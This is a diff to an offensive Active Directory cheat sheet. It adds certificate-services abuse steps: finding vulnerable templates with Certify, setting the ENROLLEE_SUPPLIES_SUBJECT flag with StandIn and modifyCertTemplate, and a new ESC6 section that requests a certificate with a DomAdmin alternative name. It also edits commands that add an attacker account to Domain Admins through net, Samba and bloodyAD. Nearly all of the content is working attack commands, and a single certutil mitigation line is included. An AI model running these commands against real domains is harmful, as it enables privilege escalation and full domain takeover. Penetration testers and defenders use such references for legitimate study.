@@ -76,6 +76,7 @@
       - [ESC1 - Misconfigured Certificate Templates](#esc1---misconfigured-certificate-templates)
       - [ESC2 - Misconfigured Certificate Templates](#esc2---misconfigured-certificate-templates)
       - [ESC4 - Access Control Vulnerabilities](#esc4---access-control-vulnerabilities)
+      * [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ](#esc6---editf_attributesubjectaltname2)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
@@ -2182,7 +2183,8 @@ secretsdump.py -k -no-pass target.lab.local
 
 ### Active Directory Certificate Services
 
-Find ADCS Server : `crackmapexec ldap domain.lab -u username -p password -M adcs`
+* Find ADCS Server : `crackmapexec ldap domain.lab -u username -p password -M adcs`
+* Enumerate AD Enterprise CAs with certutil: `certutil.exe -config - -ping`
 
 #### ESC1 - Misconfigured Certificate Templates
 
@@ -2197,6 +2199,7 @@ Exploitation:
 * Use [Certify.exe](https://github.com/GhostPack/Certify) to see if there are any vulnerable templates
     ```ps1
     Certify.exe find /vulnerable
+    Certify.exe find /vulnerable /currentuser
     or
     PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
     ```
@@ -2223,7 +2226,7 @@ Exploitation:
 #### ESC2 - Misconfigured Certificate Templates
 
 Requirements:
-*  Allows requesters to specify a SAN in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)
+*  Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)
 
 Exploitation:
 * Find template
@@ -2235,6 +2238,8 @@ Exploitation:
 
 #### ESC4 - Access Control Vulnerabilities
 
+> Enabling the `mspki-certificate-name-flag` flag for a template that allows for domain authentication, allow attackers to "push a misconfiguration to a template leading to ESC1 vulnerability
+
 * Search for `WriteProperty` with value `00000000-0000-0000-0000-000000000000` using [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate)
   ```ps1
   python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl
@@ -2242,11 +2247,31 @@ Exploitation:
 * Add the `ENROLLEE_SUPPLIES_SUBJECT` (ESS) flag to perform ESC1
   ```ps1
   python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag
+
+  # Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. 
+  C:\>StandIn.exe --adcs --filter WebServer --ess --add
   ```
 * Perform ESC1 and then restore the value
   ```ps1
   python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
   ```
+
+#### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 
+
+> If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name. 
+
+Exploitation:
+* Use [Certify.exe](https://github.com/GhostPack/Certify) to check for **UserSpecifiedSAN** flag state which refers to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.
+    ```ps1
+    Certify.exe cas
+    ```
+* Request a certificate for a template and add an altname, even though the default `User` template doesn't normally allow to specify alternative names
+    ```ps1
+    .\Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:User /altname:DomAdmin
+    ```
+
+Mitigation:   
+* Remove the flag : `certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2`
 
 
 #### ESC8 - AD CS Relay Attack
@@ -2363,13 +2388,13 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
 #### GenericAll
 
 * **GenericAll on User** : We can reset user's password without knowing the current password
-* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : 
-	* On Windows : `net group "domain admins" spotless /add /domain`
+* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user hacker) to the Domain Admin group : 
+	* On Windows : `net group "domain admins" hacker /add /domain`
 	* On Linux:
 		* using the Samba software suite : 
-		`net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'AttackerUser%MyPassword' -W DOMAIN -I [DC IP]`
+		`net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]`
 		* using bloodyAD: 
-		`bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword addObjectToGroup UserToAdd 'GROUP NAME'`
+		`bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME'`
 
 * **GenericAll/GenericWrite** : We can set a **SPN** on a target account, request a TGS, then grab its hash and kerberoast it.
   ```powershell
